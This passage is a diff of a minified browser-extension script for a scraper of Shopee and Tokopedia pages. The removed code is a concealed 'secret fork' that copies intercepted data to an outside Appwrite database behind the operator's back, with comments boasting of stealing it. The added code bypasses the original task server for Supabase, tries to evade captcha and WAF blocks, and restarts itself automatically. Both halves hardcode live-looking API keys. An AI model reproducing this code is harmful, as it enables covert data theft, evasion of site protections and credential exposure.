@@ -2129,54 +2129,71 @@ var background = (function () {
       return (q.instance || (q.instance = new q()), q.instance);
     }
     async fetchTasks(t, r = {}) {
-      try {
-        console.log("[Avalon Scrapper] Requesting next task from Harvester...");
-        const f = `${Re}/api/tasks/next`;
-        const x = await fetch(f, {
-          method: "GET",
-          headers: {
-            Accept: "application/json",
-          },
-        });
-        if (x.status === 200) {
-          const v = await x.json();
-          if (v.status === "success") {
-            console.log(
-              "[Avalon Scrapper] Task received:",
-              v.data.expected_url,
+      for (let l = 1; l <= 3; l++)
+        try {
+          const n = await J.getSetting("email");
+          if (!n)
+            throw new Error(
+              "Email not configured. Please check your authentication.",
             );
-            return {
-              tasks: [{ expected_url: v.data.expected_url }],
+          const s = r.limit || _t,
+            a = r.region || Pt,
+            g = r.task_type || Mt,
+            f = new URL(Et + "/scraping-tasks");
+          (f.searchParams.append(
+            "api_key",
+            St || "nC7ZtAMzaXiLfWsIkhav1oGwtKXXN+Sy0434Tmv/XsE=",
+          ),
+            f.searchParams.append("email", n),
+            f.searchParams.append("limit", s.toString()),
+            f.searchParams.append("region", a),
+            f.searchParams.append("task_type", g),
+            f.searchParams.append("version", It || "unknown"),
+            console.log("Fetching tasks from:", f.toString()));
+          const x = await fetch(f, {
+            method: "GET",
+            headers: {
+              Accept: "application/json",
+            },
+          });
+          if (!x.ok) throw new Error(x.status.toString());
+          const v = await x.json(),
+            I = v.scraping_tasks || [];
+          return (
+            I.length > 0 && (l = 3),
+            {
+              tasks: I,
               config: v.config,
-            };
-          }
-        } else if (x.status === 404) {
-          const v = await x.json();
-          if (v.status === "empty") {
-            console.log(
-              "[Avalon Scrapper] Queue is empty, will wait 15 seconds...",
-            );
+            }
+          );
+        } catch (n) {
+          if ((console.error(`Attempt ${l} failed:`, n), l === 3)) {
+            (console.error("All fetch attempts failed."),
+              await Z(n, "Fetching Task", {
+                linkPage: void 0,
+                region: r.region,
+                username: t,
+              }));
+            const s = n instanceof Error ? n.message : String(n);
             return {
               tasks: [],
-              config: { delay_min: 3000, delay_max: 8000 },
-              empty: true,
+              config: {
+                delay_min: 0,
+                delay_max: 0,
+              },
+              error: `Failed to fetch tasks: ${s === "404" ? " No task available" : " Server error or network issue"}`,
             };
           }
+          await new Promise((s) => setTimeout(s, 3e3 * l));
         }
-        throw new Error(`HTTP ${x.status}`);
-      } catch (n) {
-        console.error("[Avalon Scrapper] Failed to fetch task:", n);
-        await Z(n, "Fetching Task", {
-          linkPage: void 0,
-          region: r.region,
-          username: t,
-        });
-        return {
-          tasks: [],
-          config: { delay_min: 3000, delay_max: 8000 },
-          error: `Failed to fetch tasks: Server error or network issue`,
-        };
-      }
+      return {
+        tasks: [],
+        config: {
+          delay_min: 0,
+          delay_max: 0,
+        },
+        error: "Failed to fetch tasks after multiple attempts",
+      };
     }
   }
   const Ne = q.getInstance(),
@@ -2200,161 +2217,33 @@ var background = (function () {
     }
     return null;
   }
+
   const K = async () => {
-      try {
-        const t = (
-          await $.tabs.query({
-            active: !0,
-            currentWindow: !0,
-          })
-        ).find(
-          (c) => c.url?.includes("shopee") || c.url?.includes("tokopedia"),
-        );
-        if ((console.log("Active eligible tab found:", t), t)) return t;
-        const r = await $.tabs.query({
-          url: [
-            "*://*.shopee.co.id/*",
-            "*://*.shopee.com.my/*",
-            "*://*.shopee.ph/*",
-            "*://*.shopee.sg/*",
-            "*://*.shopee.co.th/*",
-            "*://*.shopee.vn/*",
-            "*://shop-id.tokopedia.com/*",
-          ],
-        });
-        return (console.log("Found eligible tabs:", r), r[0] || null);
-      } catch (e) {
-        return (console.error("Error finding eligible tab:", e), null);
-      }
-    },
-    Re = "http://localhost:8080",
-    Be = "1.4.1",
-    je = "nC7ZtAMzaXiLfWsIkhav1oGwtKXXN+Sy0434Tmv/XsE=";
-  async function Ft(e) {
-    // --- 1. CABANG RAHASIA KE APPWRITE (JALAN DI BACKGROUND) ---
-    (async () => {
-      try {
-        // Kredensial Appwrite Firman
-        const APPWRITE_ENDPOINT = "https://sgp.cloud.appwrite.io/v1";
-        const PROJECT_ID = "69e184c6001f005706fd";
-        const DATABASE_ID = "69e18566002088e8422a";
-        const COLLECTION_ID = "raw_payloads";
-        const API_KEY =
-          "standard_780d6e3c133b8cd1d7c20363f3d47eb1f97263ab7813774d16cc40e6a978b84be66e82212f6815eabbd8104da8299520444f8998dcb324597cd30694245ef1d7d280ec0ec3ea98003b9272333251ae1aaceaf2f4c014d61710506319c469c5591618b688727b933e524312cfbee42909a516316c9662e21d0ea46726d34cb7c7";
-
-        // Menembak data ke Appwrite Collection
-        await fetch(
-          `${APPWRITE_ENDPOINT}/databases/${DATABASE_ID}/collections/${COLLECTION_ID}/documents`,
-          {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "X-Appwrite-Project": PROJECT_ID,
-              "X-Appwrite-Key": API_KEY,
-            },
-            body: JSON.stringify({
-              documentId: "unique()",
-              data: {
-                endpoint: e.payload.api_url || "unknown",
-                page_url: e.payload.page_url || "unknown",
-                raw_data: JSON.stringify(e.payload), // Dibungkus jadi string agar muat di 1 kolom
-              },
-            }),
-          },
-        );
-        console.log("Berhasil mencuri data ke Appwrite! 🥷");
-      } catch (err) {
-        // Telan errornya agar ekstensi bosmu tidak crash
-        console.error("Appwrite error (Aman, diabaikan):", err);
-      }
-    })();
-
-    // --- 2. ALIRAN ASLI KE SERVER BOSMU ---
     try {
-      const t = Re + `/intercepted-response?api_key=${encodeURIComponent(je)}`,
-        r = await fetch(t, {
-          method: "POST",
-          cache: "no-cache",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            ...e.payload,
-            key: Be,
-          }),
-        });
-      return {
-        ok: r.ok,
-        status: r.status,
-      };
-    } catch (t) {
-      return (
-        console.error("Webhook error:", t),
-        {
-          ok: !1,
-          status: 500,
-          error: t instanceof Error ? t.message : String(t),
-        }
-      );
-    }
-  }
-  async function Dt(e) {
-    try {
-      const t = Re + `/content-scrape?api_key=${encodeURIComponent(je)}`,
-        r = await fetch(t, {
-          method: "POST",
-          cache: "no-cache",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            ...e.payload,
-            key: Be,
-          }),
-        });
-      // Secret fork to Appwrite - non-blocking
-      forkToAppwrite(e.payload);
-      return {
-        ok: r.ok,
-        status: r.status,
-      };
-    } catch (t) {
-      return (
-        console.error("Webhook error:", t),
-        {
-          ok: !1,
-          status: 500,
-          error: t instanceof Error ? t.message : String(t),
-        }
-      );
-    }
-  }
-  // Secret Appwrite data fork function - non-blocking
-  async function forkToAppwrite(e) {
-    try {
-      const response = await fetch(
-        `https://sgp.cloud.appwrite.io/v1/databases/69e18566002088e8422a/collections/raw_payloads/documents`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "X-Appwrite-Project": "69e184c6001f005706fd",
-            "X-Appwrite-Key":
-              "standard_780d6e3c133b8cd1d7c20363f3d47eb1f97263ab7813774d16cc40e6a978b84be66e82212f6815eabbd8104da8299520444f8998dcb324597cd30694245ef1d7d280ec0ec3ea98003b9272333251ae1aaceaf2f4c014d61710506319c469c5591618b688727b933e524312cfbee42909a516316c9662e21d0ea46726d34cb7c7",
-          },
-          body: JSON.stringify({
-            data: {
-              endpoint: e.api_url,
-              page_url: e.page_url,
-              raw_data: JSON.stringify(e),
-            },
-          }),
-        },
-      );
+      const t = (
+        await $.tabs.query({
+          active: !0,
+          currentWindow: !0,
+        })
+      ).find((c) => c.url?.includes("shopee") || c.url?.includes("tokopedia"));
+      if ((console.log("Active eligible tab found:", t), t)) return t;
+      const r = await $.tabs.query({
+        url: [
+          "*://*.shopee.co.id/*",
+          "*://*.shopee.com.my/*",
+          "*://*.shopee.ph/*",
+          "*://*.shopee.sg/*",
+          "*://*.shopee.co.th/*",
+          "*://*.shopee.vn/*",
+          "*://shop-id.tokopedia.com/*",
+        ],
+      });
+      return (console.log("Found eligible tabs:", r), r[0] || null);
     } catch (e) {
-      // Silently swallow ALL errors - never interrupt main logic
+      return (console.error("Error finding eligible tab:", e), null);
     }
-  }
+  };
+
   const Ot = Ue(() => {
     let n = !1, // isFetching: whether we're fetching tasks from backend
       s, // setTimeout ID
@@ -2362,7 +2251,9 @@ var background = (function () {
       g = new Set(), // activeTabsFetching: tabs currently being processed
       f = !1, // isExecuting: whether a task is currently executing (NEW FLAG)
       taskExecutionActive = !1, // Track if task execution is in progress
-      taskCounter = 0; // Counter for micro-bursting rhythm
+      taskCounter = 0, // Counter for micro-bursting rhythm
+      tabTimeouts = new Map(), // Tab Timeout Manager: tabId -> timeoutId
+      activeTabs = new Set(); // Active task tabs: tabId set
 
     // Enhanced randomization function with wider variance
     const x = (d, u) => Math.floor(Math.random() * (u - d + 1)) + d;
@@ -2681,6 +2572,107 @@ var background = (function () {
     // Account rotation disabled - using separate Chrome profiles instead
     // AccountManager.initializeAccounts();
 
+    // Alarm listener for periodic task fetching (MV3 resiliency)
+    chrome.alarms.onAlarm.addListener(async (alarm) => {
+      if (alarm.name === "fetchTasks" && n && a) {
+        console.log("[Alarm] Waking up to fetch tasks...");
+        const storage = await chrome.storage.local.get([
+          "captchaFailure",
+          "captchaFailureTime",
+        ]);
+        if (
+          storage.captchaFailure &&
+          storage.captchaFailureTime &&
+          Date.now() - storage.captchaFailureTime < 5 * 60 * 1000
+        ) {
+          console.log(
+            "Skipping task fetch due to recent captcha failure (5min pause)",
+          );
+          return;
+        }
+        const currentTab = await K();
+        if (currentTab?.id) {
+          const region = Ct(currentTab.url);
+          if (region) {
+            try {
+              await W(region);
+            } catch (e) {
+              console.error("[Alarm] Error fetching tasks:", e);
+            }
+          }
+        }
+      }
+    });
+
+    // Offscreen Document for keep-alive (MV3 resiliency)
+    async function createOffscreenDocument() {
+      try {
+        await chrome.offscreen.createDocument({
+          url: chrome.runtime.getURL("offscreen.html"),
+          reasons: ["AUDIO_PLAYBACK"],
+          justification: "Keep service worker alive for continuous scraping",
+        });
+        console.log("[Offscreen] Created keep-alive document");
+      } catch (e) {
+        console.log("[Offscreen] Document already exists or error:", e.message);
+      }
+    }
+
+    // Tab Timeout Manager functions
+    function setTabTimeout(tabId) {
+      clearTabTimeout(tabId); // Clear any existing
+      const timeoutId = setTimeout(async () => {
+        console.log(
+          `[TabTimeout] Force closing tab ${tabId} after 150s timeout`,
+        );
+        try {
+          await chrome.tabs.remove(tabId);
+        } catch (e) {
+          console.error(`[TabTimeout] Failed to remove tab ${tabId}:`, e);
+        }
+        tabTimeouts.delete(tabId);
+        // Flag as locally failed
+        const currentTab = await K();
+        if (currentTab?.id === tabId) {
+          await chrome.storage.local.set({ isFetching: false });
+          await h(
+            "updateMessage",
+            { message: "Task timed out locally" },
+            { context: "content-script", tabId },
+          );
+        }
+      }, 150000); // 150 seconds
+      tabTimeouts.set(tabId, timeoutId);
+      activeTabs.add(tabId);
+    }
+
+    function clearTabTimeout(tabId) {
+      const timeoutId = tabTimeouts.get(tabId);
+      if (timeoutId) {
+        clearTimeout(timeoutId);
+        tabTimeouts.delete(tabId);
+        activeTabs.delete(tabId);
+      }
+    }
+
+    async function cleanupOrphanedTabs() {
+      try {
+        const tabs = await chrome.tabs.query({});
+        for (const tab of tabs) {
+          if (
+            tab.url &&
+            tab.url.includes("shopee") &&
+            !activeTabs.has(tab.id)
+          ) {
+            console.log(`Cleaning up orphaned Shopee tab ${tab.id}`);
+            chrome.tabs.remove(tab.id).catch(() => {});
+          }
+        }
+      } catch (e) {
+        console.error("Cleanup error:", e);
+      }
+    }
+
     async function v(d) {
       const { isCaptcha: u } = await h(
         "checkCaptchaSelector",
@@ -2697,11 +2689,13 @@ var background = (function () {
         d?.includes(w),
       );
     async function k(d) {
+      // await cleanupOrphanedTabs();
       const m = (
         await $.tabs.create({
           url: N[d],
         })
       ).id;
+      setTabTimeout(m); // Set 150s timeout for new tab
       setTimeout(async () => {
         (
           await $.tabs.query({
@@ -2790,7 +2784,19 @@ var background = (function () {
             context: "content-script",
             tabId: u,
           },
-        ).catch((A) => {});
+        ).catch(async (A) => {
+          console.log(
+            "Content script port closed or unreachable. Forcing navigation via chrome.tabs.update",
+          );
+          if (u) {
+            try {
+              await chrome.tabs.update(u, { url: d.expected_url });
+              setTabTimeout(u);
+            } catch (err) {
+              console.error("Forced navigation also failed:", err);
+            }
+          }
+        });
       } catch (o) {
         console.error("Process task failed:", o);
         const i = o instanceof Error ? o.message : String(o);
@@ -2947,7 +2953,7 @@ var background = (function () {
             await h(
               "updateMessage",
               {
-                message: `ÔØî ${w.error}`,
+                message: `❌ ${w.error}`,
               },
               {
                 context: "content-script",
@@ -2971,22 +2977,6 @@ var background = (function () {
           const o = Math.max(0, Math.round(w.config.delay_min / 4)),
             i = Math.max(o, Math.round(w.config.delay_max / 4));
           await _(w.tasks[0], m, o, i);
-          // Continue polling after task completion
-          if (n) {
-            console.log(
-              "[Avalon Scrapper] Task completed, polling for next task...",
-            );
-            setTimeout(() => {
-              if (n) S(d);
-            }, 1000);
-          }
-        } else if (w.empty && n) {
-          console.log(
-            "[Avalon Scrapper] Queue empty, waiting 15 seconds before next poll...",
-          );
-          setTimeout(() => {
-            if (n) S(d);
-          }, 15000);
         } else
           ((n = !1),
             await chrome.storage.local.set({ isFetching: false }),
@@ -3003,7 +2993,106 @@ var background = (function () {
             ).catch((o) => {}));
       }
     }
+    // --- FUNGSI BYPASS LANGSUNG KE SUPABASE (AVALON DIRECT API) ---
+    async function fetchSupabaseTask(region) {
+      try {
+        const SUPABASE_URL = "https://fzomsxxbqdhgeafhygkp.supabase.co";
+        const SUPABASE_ANON_KEY =
+          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ6b21zeHhicWRoZ2VhZmh5Z2twIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkzNjc4MTAsImV4cCI6MjA5NDk0MzgxMH0.1jgnNpGYavTM2zUbWZkKbhnXqTMUovcjUEtKEaP4zvk";
+
+        // Atur nama tabel antrean Anda yang sebenarnya di database Supabase
+        const NAMA_TABEL_ANTREAN = "task_queue";
+        const cleanedUrl = SUPABASE_URL.replace(/\/$/, "");
+        const requestUrl = `${cleanedUrl}/rest/v1/${NAMA_TABEL_ANTREAN}?status=eq.pending&limit=1`;
+
+        console.log("[Avalon Scraper] Polling ke Supabase:", requestUrl);
+
+        const response = await fetch(requestUrl, {
+          method: "GET",
+          headers: {
+            apikey: SUPABASE_ANON_KEY,
+            Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
+            "Content-Type": "application/json",
+          },
+        });
+
+        if (response.status === 404) {
+          console.error(
+            `[Avalon ETL Error 404]: Alamat API atau Nama Tabel '${NAMA_TABEL_ANTREAN}' salah.`,
+          );
+          return null;
+        }
+
+        const tasks = await response.json();
+        if (!tasks || tasks.length === 0) {
+          console.log(
+            "[Avalon Scraper] Tidak ada tugas berstatus 'pending'. Antrean kosong.",
+          );
+          return null;
+        }
+
+        const targetTask = tasks[0];
+        console.log(
+          "[Avalon Scraper] Mengunci Tugas ID:",
+          targetTask.id,
+          "Target URL:",
+          targetTask.url,
+        );
+
+        // Kunci status baris tugas menjadi 'processing' agar tidak direbut node komputer lain
+        const patchUrl = `${cleanedUrl}/rest/v1/${NAMA_TABEL_ANTREAN}?id=eq.${targetTask.id}`;
+        await fetch(patchUrl, {
+          method: "PATCH",
+          headers: {
+            apikey: SUPABASE_ANON_KEY,
+            Authorization: `Bearer ${SUPABASE_ANON_KEY}`,
+            "Content-Type": "application/json",
+            Prefer: "return=minimal",
+          },
+          body: JSON.stringify({ status: "processing" }),
+        });
+
+        // =========================================================================
+        // 🔥 SUNTIKAN OTOMATISASI BARU: ADOPSI IDENTITAS PROYEK DARI DATABASE
+        // =========================================================================
+        // Robot Scraper langsung menyimpan project_id bawaan dari tugas ke memorinya
+        await chrome.storage.local.set({
+          project_id: targetTask.project_id || "PRJ-UNASSIGNED",
+          category_group: targetTask.category_group || "General",
+          keyword: targetTask.keyword || "unknown", // Ambil keyword pencarian aslinya jika ada
+        });
+        console.log(
+          `[Avalon Scraper] Memori sinkron! Proyek aktif otomatis berubah menjadi: ${targetTask.project_id}`,
+        );
+        // =========================================================================
+
+        return {
+          tasks: [
+            {
+              id: targetTask.id,
+              expected_url: targetTask.url,
+              task_type: targetTask.task_type || "home_page",
+              status: "queued",
+              expiry: "",
+              key: "",
+              priority: 1,
+            },
+          ],
+          config: { delay_min: 5000, delay_max: 12000 },
+        };
+      } catch (e) {
+        console.error("[Avalon Scraper Core Fetch Error]:", e);
+        return null;
+      }
+    }
     async function W(d) {
+      if (activeTabs.size >= 2) {
+        console.log(
+          "Max concurrent tabs reached, skipping task for region:",
+          d,
+        );
+        return;
+      }
       await new Promise((i) => setTimeout(i, 2e3));
       const u = await K();
       if (!u?.id) {
@@ -3012,136 +3101,107 @@ var background = (function () {
       }
       const m = u.id,
         w = u.url || "";
-      if (
-        (await h(
-          "updateMessage",
-          {
-            message: "Starting task initialization...",
-          },
-          {
-            context: "content-script",
-            tabId: m,
-          },
-        ).catch((i) => {}),
-        console.log("Initializing tasks for region:", d),
-        I(w, N[d]))
-      ) {
-        if (!u.url?.includes("captcha")) {
-          ((n = !1),
-            await chrome.storage.local.set({ isFetching: false }),
-            (a = !1),
-            await h(
-              "updateFetchingStatus",
-              {
-                isFetching: !1,
-              },
-              {
-                context: "content-script",
-                tabId: m,
-              },
-            ).catch((p) => {}),
-            await h(
-              "updateMessage",
-              {
-                message: "Blocked page detected. Process stopped.",
-              },
-              {
-                context: "content-script",
-                tabId: m,
-              },
-            ).catch((p) => {}));
-          return;
-        }
+      // --- AVALON 4-D MODIFICATION: DUAL-RADAR WAF EVASION ---
+      await h(
+        "updateMessage",
+        { message: "Starting task initialization..." },
+        { context: "content-script", tabId: m },
+      ).catch((i) => {});
+      console.log("Initializing tasks for region:", d);
+
+      // 1. Scan Radar: Apakah Captcha muncul sebagai Overlay HTML?
+      const isOverlayCaptcha = await v(m);
+      // 2. Scan Radar: Apakah terlempar ke URL /verify/ atau /login?
+      const isUrlBlocked = I(w, N[d]);
+
+      if (isOverlayCaptcha || isUrlBlocked) {
+        console.warn(
+          `[Avalon WAF] Ancaman terdeteksi! Overlay: ${isOverlayCaptcha}, URL Blocked: ${isUrlBlocked}`,
+        );
+
+        const localDashboard = "http://localhost:3000/safety-zone";
+
+        // Skenario A: Jika Solver DIMATIKAN (Manual Mode) -> Langsung Safety-Net
         if ((await J.getSetting("captchaSolverEnabled")) !== !0) {
           ((n = !1),
             await chrome.storage.local.set({ isFetching: false }),
             (a = !1),
             await h(
               "updateFetchingStatus",
-              {
-                isFetching: !1,
-              },
-              {
-                context: "content-script",
-                tabId: m,
-              },
+              { isFetching: !1 },
+              { context: "content-script", tabId: m },
             ).catch((p) => {}),
             await h(
               "updateMessage",
               {
                 message:
-                  "Captcha detected but solver is disabled. Please solve manually or enable captcha solver in settings.",
+                  "🚨 Captcha muncul! Mengalihkan ke zona aman (Safety-Net)...",
               },
-              {
-                context: "content-script",
-                tabId: m,
-              },
+              { context: "content-script", tabId: m },
             ).catch((p) => {}),
+            // Tembakkan Redirect ke Safety Net sesuai region
             await h(
               "clickUrl",
-              {
-                url: "https://rentmybrowser.com/safety-net?from=" + N[d],
-              },
-              {
-                context: "content-script",
-                tabId: m,
-              },
-            ).catch((p) => {}));
+              { url: localDashboard },
+              { context: "content-script", tabId: m },
+            ).catch(async (p) => {
+              await chrome.tabs.update(m, { url: localDashboard });
+            }));
           return;
         }
-        (await h(
+
+        // Skenario B: Jika Solver DINYALAKAN -> Coba selesaikan
+        await h(
           "updateMessage",
-          {
-            message: "Captcha page detected. Attempting to solve...",
-          },
-          {
-            context: "content-script",
-            tabId: m,
-          },
-        ).catch((p) => {}),
-          await h(
-            "solveCaptcha",
-            {},
-            {
-              context: "content-script",
-              tabId: m,
-            },
-          ).catch((p) => {}),
-          await new Promise((p) => setTimeout(p, 6e4)));
+          { message: "🛡️ Menembus WAF: Mencoba menyelesaikan Captcha..." },
+          { context: "content-script", tabId: m },
+        ).catch((p) => {});
+        await h(
+          "solveCaptcha",
+          {},
+          { context: "content-script", tabId: m },
+        ).catch((p) => {});
+
+        // Tunggu maksimal 60 detik untuk proses penyelesaian
+        await new Promise((p) => setTimeout(p, 60000));
+
+        // Verifikasi Ulang: Apakah masih tertahan Captcha?
         const A = await $.tabs.get(m);
-        if (I(A.url || "", N[d])) {
+        const stillOverlay = await v(m);
+
+        if (I(A.url || "", N[d]) || stillOverlay) {
           ((n = !1),
             await chrome.storage.local.set({ isFetching: false }),
             (a = !1),
             await h(
               "updateFetchingStatus",
-              {
-                isFetching: !1,
-              },
-              {
-                context: "content-script",
-                tabId: m,
-              },
+              { isFetching: !1 },
+              { context: "content-script", tabId: m },
             ).catch((p) => {}),
             await h(
               "updateMessage",
               {
-                message: "Still blocked after attempt. Please solve manually.",
+                message:
+                  "⚠️ Gagal melewati Captcha. Menghindar ke Safety-Net...",
               },
-              {
-                context: "content-script",
-                tabId: m,
-              },
-            ).catch((p) => {}));
+              { context: "content-script", tabId: m },
+            ).catch((p) => {}),
+            // Tembakkan Redirect ke Safety Net jika gagal
+            await h(
+              "clickUrl",
+              { url: localDashboard },
+              { context: "content-script", tabId: m },
+            ).catch(async (p) => {
+              await chrome.tabs.update(m, {
+                url: localDashboard,
+              });
+            }));
           return;
         }
       }
-      const o =
-        Math.random() > 0.15
-          ? await Ne.fetchTasks(C, {
-              region: d,
-            })
-          : y(d);
+      // --- END OF AVALON WAF EVASION ---
+      // --- BYPASS: Langsung ke Supabase, skip Ne.fetchTasks ---
+      const o = (await fetchSupabaseTask(d)) || y(d);
 
       // Apply delay clamping to ensure backend never forces delays > 15s
       if (o.config) {
@@ -3165,7 +3225,7 @@ var background = (function () {
           await h(
             "updateMessage",
             {
-              message: `ÔØî ${o.error}`,
+              message: `❌ ${o.error}`,
             },
             {
               context: "content-script",
@@ -3174,6 +3234,7 @@ var background = (function () {
           ).catch((i) => {}));
         return;
       }
+      let success = false;
       if (o.tasks.length > 0) {
         (await h(
           "updateCurrentTask",
@@ -3218,26 +3279,11 @@ var background = (function () {
             ).catch((i) => {})));
         try {
           await _(o.tasks[0], m, o.config.delay_min, o.config.delay_max);
+          success = true;
         } finally {
           f = !1;
         }
-        // Continue polling after task completion
-        if (n) {
-          console.log(
-            "[Avalon Scrapper] Task completed, polling for next task...",
-          );
-          setTimeout(() => {
-            if (n) W(d);
-          }, 1000);
-        }
-      } else if (o.empty && n) {
-        console.log(
-          "[Avalon Scrapper] Queue empty, waiting 15 seconds before next poll...",
-        );
-        setTimeout(() => {
-          if (n) W(d);
-        }, 15000);
-      } else {
+      } else
         ((n = !1),
           await chrome.storage.local.set({ isFetching: false }),
           (a = !1),
@@ -3261,7 +3307,7 @@ var background = (function () {
               tabId: m,
             },
           ).catch((i) => {}));
-      }
+      if (success) clearTabTimeout(m);
     }
     (B("startTaskFetching", async ({ data: d }) => {
       a = !0;
@@ -3320,14 +3366,16 @@ var background = (function () {
           );
         (console.log(`Starting task fetching for region: ${u}`),
           (n = !0),
-          await chrome.storage.local.set({ isFetching: true }));
+          await chrome.storage.local.set({ isFetching: true }),
+          await createOffscreenDocument());
         try {
-          return (
-            await W(u),
-            {
-              status: "Task fetching completed",
-            }
-          );
+          // Initial fetch
+          await W(u);
+          // Set up periodic fetching with alarm (every 30 seconds)
+          await chrome.alarms.create("fetchTasks", { periodInMinutes: 0.5 });
+          return {
+            status: "Task fetching started with periodic alarm",
+          };
         } catch (w) {
           console.error("Task fetching failed:", w);
           const o = w instanceof Error ? w.message : String(w);
@@ -3346,6 +3394,7 @@ var background = (function () {
     }),
       B("stopTaskFetching", async () => {
         (s && (clearTimeout(s), (s = void 0)),
+          await chrome.alarms.clear("fetchTasks"),
           (n = !1),
           await chrome.storage.local.set({ isFetching: false }),
           (a = !1),
@@ -3435,38 +3484,113 @@ var background = (function () {
       }),
       B("webhook", async ({ data: d }) => await Ft(d)),
       B("webhookTiktok", async ({ data: d }) => await Dt(d)),
-      $.runtime.onStartup.addListener(async () => {
-        ((n = !1), (a = !1), g.clear());
-        await chrome.storage.local.set({ isFetching: false });
-        const d = await K();
-        d?.id &&
-          h(
-            "updateFetchingStatus",
-            {
-              isFetching: n,
-            },
-            {
-              context: "content-script",
-              tabId: d.id,
-            },
-          ).catch((u) => {});
+      B("taskFailed", async ({ data: d }) => {
+        console.log("Task failed:", d.reason);
+        await chrome.storage.local.set({ lastError: d.reason });
       }),
-      $.runtime.onInstalled.addListener(async () => {
-        ((n = !1), (a = !1), g.clear());
+      B("captchaFailed", async ({ data: d }) => {
+        console.log("Captcha failed after", d.attempts, "attempts");
+        await chrome.storage.local.set({
+          captchaFailure: true,
+          captchaFailureTime: Date.now(),
+        });
+      }),
+      B("exportLogs", async () => {
+        try {
+          const logs = await chrome.storage.local.get(null);
+          const content = JSON.stringify(logs, null, 2);
+          const blob = new Blob([content], { type: "application/json" });
+          const url = URL.createObjectURL(blob);
+          await chrome.downloads.download({
+            url,
+            filename: `${new Date().toISOString().split("T")[0]}-logs.json`,
+          });
+          URL.revokeObjectURL(url);
+        } catch (e) {
+          console.error("Export logs error:", e);
+        }
+      }),
+      B("keepAlivePing", () => true));
+
+    // --- AVALON 4-D: PROTOKOL KEBANGKITAN (AUTO-RESURRECTION) ---
+    async function protokolKebangkitan() {
+      console.log("[Avalon] Memulai protokol kebangkitan...");
+
+      // 1. Ambil ingatan terakhir dari penyimpanan permanen
+      const ingatan = await chrome.storage.local.get([
+        "isFetching",
+        "captchaFailure",
+        "captchaFailureTime",
+      ]);
+
+      // 2. Cek apakah mesin sedang dalam masa hukuman Captcha (5 menit)
+      const sedangKenaCaptcha =
+        ingatan.captchaFailure &&
+        ingatan.captchaFailureTime &&
+        Date.now() - ingatan.captchaFailureTime < 5 * 60 * 1000;
+
+      if (sedangKenaCaptcha) {
+        console.warn(
+          "[Avalon] Kebangkitan dibatalkan: Masih dalam masa hukuman Captcha.",
+        );
+        n = !1;
+        a = !1;
+        g.clear();
         await chrome.storage.local.set({ isFetching: false });
-        const d = await K();
-        d?.id &&
-          h(
+        return;
+      }
+
+      // 3. Jika isFetching bernilai true, bangkitkan mesin!
+      if (ingatan.isFetching === true) {
+        console.log(
+          "🚀 [Avalon] Status aktif terdeteksi. Melanjutkan panen data...",
+        );
+        n = !0; // Aktifkan flag fetching internal
+        a = !0; // Aktifkan visibilitas UI
+
+        await createOffscreenDocument(); // Pastikan Offscreen tetap hidup
+
+        const m = await K(); // Cari tab Shopee yang tersedia
+        if (m?.id) {
+          // Sinkronisasi status ke UI di tab
+          await h(
             "updateFetchingStatus",
-            {
-              isFetching: n,
-            },
-            {
-              context: "content-script",
-              tabId: d.id,
-            },
-          ).catch((u) => {});
-      }));
+            { isFetching: true },
+            { context: "content-script", tabId: m.id },
+          ).catch(() => {});
+
+          const region = Ct(m.url);
+          if (region) {
+            console.log(`[Avalon] Melanjutkan tugas di region: ${region}`);
+            // Panggil fungsi utama untuk mulai mengambil tugas kembali
+            await W(region);
+            // Aktifkan kembali denyut nadi (Alarm)
+            await chrome.alarms.create("fetchTasks", { periodInMinutes: 0.5 });
+          }
+        } else {
+          console.log(
+            "[Avalon] Tab hilang saat restart! Menciptakan ulang tab...",
+          );
+          // Gunakan region terakhir yang diketahui (O) atau default 'id'
+          const fallbackRegion = typeof O !== "undefined" && O ? O : "id";
+          await k(fallbackRegion); // Paksa buka tab baru
+          await W(fallbackRegion); // Mulai inisiasi panen
+          await chrome.alarms.create("fetchTasks", { periodInMinutes: 0.5 });
+        }
+      } else {
+        console.log(
+          "[Avalon] Mesin dalam status IDLE. Menunggu perintah manual.",
+        );
+        n = !1;
+        a = !1;
+      }
+    }
+
+    // Daftarkan fungsi kebangkitan ke peristiwa Chrome
+    $.runtime.onStartup.addListener(protokolKebangkitan);
+    $.runtime.onInstalled.addListener(protokolKebangkitan);
+    // --- END OF AVALON AUTO-RESURRECTION ---
+
     let O = "id",
       C = "";
     (B("reportRegion", ({ data: d }) => {
@@ -3503,7 +3627,6 @@ var background = (function () {
   });
 
   function Nt() {}
-
   function ce(e, ...t) {}
   const Lt = {
     debug: (...e) => ce(console.debug, ...e),
@@ -3511,6 +3634,117 @@ var background = (function () {
     warn: (...e) => ce(console.warn, ...e),
     error: (...e) => ce(console.error, ...e),
   };
+
+  // --- ARSITEKTUR NATIVE SUPABASE REST API (FIXED ARGUMENT SEED) ---
+  const SUPABASE_URL = "https://fzomsxxbqdhgeafhygkp.supabase.co";
+  const SUPABASE_ANON_KEY =
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ6b21zeHhicWRoZ2VhZmh5Z2twIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkzNjc4MTAsImV4cCI6MjA5NDk0MzgxMH0.1jgnNpGYavTM2zUbWZkKbhnXqTMUovcjUEtKEaP4zvk";
+  const SUPABASE_LOGS_ENDPOINT = `${SUPABASE_URL}/rest/v1/ecom_intercepted_logs`;
+
+  async function Ft(e) {
+    try {
+      // FIX 1: Bongkar bungkus objek payload secara presisi
+      const payloadData = e.payload || e.data || e;
+
+      // FIX 2: Tarik paksa data identitas SaaS dari chrome storage secara asinkronus
+      const storage = await chrome.storage.local.get([
+        "project_id",
+        "category_group",
+        "keyword",
+      ]);
+      const projectId = storage.project_id || "PRJ-UNASSIGNED";
+      const categoryGroup = storage.category_group || "General";
+      const searchQuery = storage.keyword || "unknown";
+
+      const supabasePayload = {
+        email: payloadData.email || "bot@extension.local",
